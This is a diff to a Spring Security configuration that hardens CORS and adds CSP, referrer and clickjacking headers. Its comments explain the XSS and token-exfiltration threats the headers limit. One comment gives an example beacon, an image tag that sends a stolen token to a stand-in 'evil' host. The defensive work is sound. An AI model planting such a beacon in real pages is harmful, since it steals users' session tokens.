@@ -1,5 +1,6 @@
 package com.perimity.guard.config;
 
+import com.perimity.guard.security.InternalApiKeyFilter;
 import com.perimity.guard.security.JwtAuthenticationFilter;
 import java.util.List;
 import org.springframework.context.annotation.Bean;
@@ -54,8 +55,21 @@ public class SecurityConfig {
 
     private final JwtAuthenticationFilter jwtFilter;
 
-    public SecurityConfig(JwtAuthenticationFilter jwtFilter) {
+    /**
+     * Comma-separated. The default is the two local dev servers, so nothing
+     * changes on a laptop; a deployment sets CORS_ORIGINS to its real frontend
+     * origin. Never "*" - with a token-bearing API that would let any page on
+     * the internet call this service with a victim's token in a header.
+     */
+    private final List<String> allowedOrigins;
+
+    public SecurityConfig(
+            JwtAuthenticationFilter jwtFilter,
+            @org.springframework.beans.factory.annotation.Value(
+                    "${perimity.cors.allowed-origins:http://localhost:3000,http://localhost:5173}")
+            List<String> allowedOrigins) {
         this.jwtFilter = jwtFilter;
+        this.allowedOrigins = allowedOrigins;
     }
 
     @Bean
@@ -64,6 +78,61 @@ public class SecurityConfig {
             .csrf(csrf -> csrf.disable())
             .cors(cors -> cors.configurationSource(corsSource()))
             .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
+
+            /*
+             * ==================================================================
+             * RESPONSE HEADERS - AND AN HONEST NOTE ABOUT WHAT CSP DOES NOT DO
+             * ==================================================================
+             * scanner.html has one inline <script> block, so script-src has to
+             * allow 'unsafe-inline'. That means this policy would NOT have
+             * stopped the stored-XSS bug that used to live in render(): an
+             * injected <img onerror> is inline script, and inline script is
+             * permitted here.
+             *
+             * The fix for that was using textContent instead of innerHTML, and
+             * it stays the fix. This is defence in depth for the case where
+             * another sink is added carelessly later - it does not replace
+             * escaping and should not be mistaken for it.
+             *
+             * What it DOES buy is the second half of that attack. Executing a
+             * script in the guard's browser is only useful if the payload can
+             * send the stolen token somewhere:
+             *
+             *   connect-src 'self'  - no fetch/XHR/WebSocket to another origin
+             *   img-src 'self' ...  - no <img src="https://evil/?token=..."> beacon
+             *   form-action 'none'  - no auto-submitting form to another origin
+             *   base-uri 'none'     - no <base> tag to reroute relative URLs
+             *
+             * So a payload can still run, and it can no longer phone home. That
+             * is a genuine reduction, not a fix.
+             *
+             * frame-ancestors 'none' is the clickjacking control: without it the
+             * scanner page can be framed invisibly over a decoy and a guard
+             * tricked into ending a shift or scanning.
+             *
+             * When the React shell replaces scanner.html, drop 'unsafe-inline'
+             * from script-src - at that point this becomes a real XSS control.
+             */
+            .headers(h -> h
+                    .contentSecurityPolicy(csp -> csp.policyDirectives(
+                            "default-src 'self'; "
+                            // cdnjs serves jsQR for the camera decode.
+                            + "script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; "
+                            + "style-src 'self' 'unsafe-inline'; "
+                            // data:/blob: are the canvas frames the decoder reads.
+                            + "img-src 'self' data: blob:; "
+                            + "media-src 'self' blob:; "
+                            + "worker-src 'self' blob:; "
+                            + "connect-src 'self'; "
+                            + "object-src 'none'; "
+                            + "base-uri 'none'; "
+                            + "form-action 'none'; "
+                            + "frame-ancestors 'none'"))
+                    // A denial reason or a holder name must never ride along in
+                    // a Referer to cdnjs or anywhere else.
+                    .referrerPolicy(r -> r.policy(
+                            org.springframework.security.web.header.writers
+                                    .ReferrerPolicyHeaderWriter.ReferrerPolicy.NO_REFERRER)))
             .formLogin(f -> f.disable())
             .httpBasic(b -> b.disable())
             .exceptionHandling(e -> e
@@ -148,13 +217,31 @@ public class SecurityConfig {
         return http.build();
     }
 
+    /**
+     * Origins come from the environment, not from this file.
+     *
+     * They were hardcoded to two localhost ports, which is correct for a laptop
+     * and wrong everywhere else - the first deployment would have had to edit
+     * Java to let its own frontend talk to it, and the usual fix under time
+     * pressure is a wildcard.
+     *
+     * allowCredentials is FALSE. It was true, which is the setting that makes a
+     * wildcard origin illegal and makes a mistake in this list expensive. This
+     * API authenticates with a Bearer token in a header - the browser never
+     * sends a cookie here, so credentialed CORS buys nothing and only widens
+     * what a wrong entry would cost.
+     */
     @Bean
     public CorsConfigurationSource corsSource() {
         CorsConfiguration c = new CorsConfiguration();
-        c.setAllowedOrigins(List.of("http://localhost:3000", "http://localhost:5173"));
+        c.setAllowedOrigins(allowedOrigins);
         c.setAllowedMethods(List.of("GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"));
-        c.setAllowedHeaders(List.of("*"));
-        c.setAllowCredentials(true);
+        // Named rather than "*": these are the only headers the frontend sends,
+        // and a list is a thing a reviewer can check.
+        c.setAllowedHeaders(List.of("Authorization", "Content-Type", "Accept",
+                "X-Requested-With", InternalApiKeyFilter.HEADER));
+        c.setAllowCredentials(false);
+        c.setMaxAge(3600L);
         UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
         source.registerCorsConfiguration("/**", c);
         return source;
